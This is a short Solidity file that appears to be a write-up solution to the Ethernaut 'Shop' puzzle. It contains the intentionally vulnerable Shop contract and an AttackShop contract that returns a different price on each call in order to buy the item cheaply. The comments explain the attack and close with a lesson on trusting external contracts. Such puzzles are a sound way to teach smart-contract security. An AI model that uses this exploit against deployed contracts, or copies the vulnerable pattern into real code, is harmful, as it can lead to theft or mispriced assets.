// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @title Shop
/// @author OpenZeppelin
/// @notice - Attack point is the interface, which is callled based on the msg.sender
///         - price is called twice from the interface
///         - from there we can create an attack that returns different values each time
///         - Old version involves the manipulation of gas
///         ex. https://medium.com/this_post/ethernaut-21-shop-writeups-e99f3ebb9b7
///         ex. https://medium.com/safeZ1/ethernaut-lvl-21-shop-walkthrough-how-to-use-assembly-code-in-solidity-and-abuse-solidity-d8ced86c0eb4
///         - Reasoning for updating the challenge here, https://github.com/OpenZeppelin/ethernaut/issues/156
///         With the new challenge the goal is to change the price since price is called twice using ternary operator or conditional operator

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

contract AttackShop {

  function price() external view returns (uint) {
    return Shop(msg.sender).isSold() ? 1 : 100; /// first part will be false, so 100, then second call will be true which will send 1
  }

  function attack(Shop _victim) external {
    Shop(_victim).buy();
  }
}

///     Contracts can manipulate data seen by other contracts in any way they want.
///     It's unsafe to change the state based on external and untrusted contracts logic.